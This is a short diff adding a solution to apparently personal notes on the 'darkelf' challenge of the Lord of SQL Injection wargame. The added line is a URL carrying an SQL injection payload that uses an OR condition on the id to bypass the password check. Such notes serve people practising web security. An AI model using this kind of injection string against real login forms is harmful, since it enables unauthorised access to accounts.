@@ -16,3 +16,4 @@ query : select id from prob_darkelf where id='guest' and pw=''
 
 #solutions
 
+https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=%27%20||%20id=%27admin
